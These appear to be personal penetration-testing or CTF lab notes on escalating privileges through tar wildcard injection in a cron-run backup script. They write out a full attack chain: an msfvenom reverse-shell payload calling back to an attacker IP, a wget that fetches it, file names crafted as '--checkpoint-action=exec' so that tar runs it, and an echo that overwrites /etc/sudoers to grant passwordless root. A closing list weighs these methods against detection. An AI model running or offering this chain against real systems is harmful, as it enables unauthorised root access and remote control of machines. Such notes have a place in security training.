
When tar is run in a script that is run for example by a cron job and it has a `*`:

Example script:
```sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

```sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

If we put a reverse shell command in a file, for example:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=444 -f elf -o revsh444.elf`
or a script or whatever.

put it in the directory
`wget 10.18.21.236/shells/revsh444.elf`

to validate the file can run on the box you can run it yourself :)

set is as executable:
`chmod +x ./shell.elf`

And also make files to emulate the options to tar to run a file like this:
`touch ./--checkpoint=1`
`touch ./--checkpoint-action=exec=revsh444.elf`

Alternative to elf

`echo 'myaccount ALL=(root) NOPASSWD: ALL' > /etc/sudoers`

`echo "" > '--checkpoint-action=exec=bash sudoer.sh'`
`touch ./'--checkpoint-action=exec=bash sudoer.sh'`

<font color="red">Note: the sh (or bash) adds current directory to the path while tar does not - Meaning we <b>NEED the sh/bash</b> here!</font>

When the script is run it will run our executable!

touch ./--checkpoint-action=exec=./revsh444.elf

if you need to delete the -- files use:
`rm -i ./*`

---

detection - which is best?
- adding executable and running it
- +s bash
- make copy of bash and +s
- adding our account to sudoers (requres actually chmoding first)
- bash rev shell
